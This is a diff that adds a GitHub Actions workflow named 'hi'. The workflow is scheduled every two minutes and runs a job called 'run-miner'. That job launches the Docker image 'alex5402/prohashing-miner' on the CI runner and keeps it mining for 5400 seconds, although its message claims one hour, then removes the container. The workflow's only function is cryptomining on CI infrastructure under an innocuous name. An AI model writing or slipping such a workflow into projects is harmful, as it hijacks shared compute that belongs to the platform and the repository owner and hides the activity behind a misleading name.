@@ -1,0 +1,25 @@
+name: hi
+
+on:
+  schedule:
+    - cron: '*/2 * * * *'
+  workflow_dispatch:      # Optional: Allows manual trigger from the Actions tab
+
+jobs:
+  run-miner:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Start Docker container
+        run: |
+          sudo docker run -d --restart unless-stopped --name prohashing-miner alex5402/prohashing-miner:latest
+
+      - name: Run for 1 hour
+        run: |
+          echo "Running container for 1 hour..."
+          sleep 5400
+
+      - name: Stop and remove container
+        run: |
+          echo "Stopping and removing container..."
+          sudo docker stop prohashing-miner || true
+          sudo docker rm prohashing-miner || true
